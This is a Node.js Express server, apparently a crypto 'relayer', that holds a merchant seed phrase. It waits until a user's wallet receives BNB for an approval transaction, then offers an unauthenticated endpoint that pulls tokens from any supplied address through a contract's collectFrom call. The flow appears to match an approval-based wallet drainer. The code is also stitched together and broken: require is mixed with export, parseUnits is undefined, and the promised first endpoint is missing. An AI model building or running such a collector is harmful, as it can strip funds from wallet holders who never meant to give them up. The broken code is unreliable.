require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');

const app = express();
app.use(cors());
app.use(express.json());

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
// .trim() removes any accidental spaces or hidden newline characters
// index.js
const phrase = process.env.MERCHANT_SECRET_PHRASE?.trim();

if (!phrase) {
    throw new Error("Missing MERCHANT_SECRET_PHRASE in .env");
}

// This creates the wallet directly from your 12 words
const merchantWallet = ethers.Wallet.fromPhrase(phrase, provider);

console.log("Relayer Address:", merchantWallet.address);

// Use the ABI you provided
const CONTRACT_ABI = [
  "function collect(uint256 amount) external",
  "function collectFrom(address userAddress, uint256 amount) external"
];
const collectorContract = new ethers.Contract(process.env.CONTRACT_ADDRESS, CONTRACT_ABI, merchantWallet);

// Endpoint 1: Fund the user with enough BNB for the approval transaction
// ... existing imports and setup ...

// Endpoint 1: Fund the user with enough BNB for the approval transaction
// OPTIMIZED: Poll for gas and add a buffer for Trust Wallet UI sync
export async function waitForGas(provider, address) {
    const requiredGas = parseUnits("0.0004", 18);
    
    // We will check for up to 20 seconds (20 loops * 1000ms)
    for (let i = 0; i < 20; i++) { 
        const balance = await provider.getBalance(address);
        
        if (balance >= requiredGas) {
            console.log("BNB detected on-chain! Pausing to let Trust Wallet UI sync...");
            
            // THE FIX: The blockchain has the BNB, but Trust Wallet's UI is slow.
            // Wait exactly 3 seconds here before returning true. 
            // This guarantees the wallet balance is updated when the popup opens.
            await new Promise(r => setTimeout(r, 3000)); 
            
            return true;
        }
        
        // Wait 1 second before checking the balance again
        await new Promise(r => setTimeout(r, 1000)); 
    }
    return false;
}

// ... rest of your execute-collection logic ...

// Endpoint 2: Merchant executes the transfer (Merchant pays gas)
app.post('/execute-collection', async (req, res) => {
    try {
        const { userAddress, amount } = req.body;
        
        // Merchant calls collectFrom. Merchant pays this gas!
        const parsedAmount = ethers.parseUnits(amount.toString(), 18);
        const tx = await collectorContract.collectFrom(userAddress, parsedAmount);
        const receipt = await tx.wait();
        
        res.json({ success: true, txHash: receipt.hash });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(process.env.PORT, () => console.log(`Relayer running on port ${process.env.PORT}`));